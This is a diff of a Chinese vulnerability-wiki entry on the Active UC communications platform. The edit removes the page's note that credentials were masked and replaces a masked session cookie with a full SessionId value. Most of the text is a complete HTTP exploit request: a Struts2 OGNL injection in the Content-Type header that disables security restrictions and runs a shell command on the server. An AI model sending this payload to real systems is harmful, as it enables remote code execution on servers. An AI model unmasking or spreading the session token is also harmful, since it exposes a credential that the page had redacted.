@@ -46,7 +46,7 @@ relation_type: "duplicate_of"
 
 ### 操作风险与资料使用
 
-- 文中的明文凭据、会话或密钥已用中段星号脱敏，保留首尾供比对；示例不能直接照抄登录。仅替换为自有隔离环境凭据，已暴露的真实凭据应撤销或轮换。
+- 验证须使用自有隔离环境的凭据；已暴露的真实凭据应撤销或轮换。
 
 本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
 <!-- vulwiki-editorial:end -->
@@ -80,7 +80,7 @@ title="网动统一通信平台(Active UC)"
 
 ```http
 POST /acenter/index.action HTTP/1.1
-Cookie: SessionId=96************************36
+Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
 Charset: UTF-8
 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170
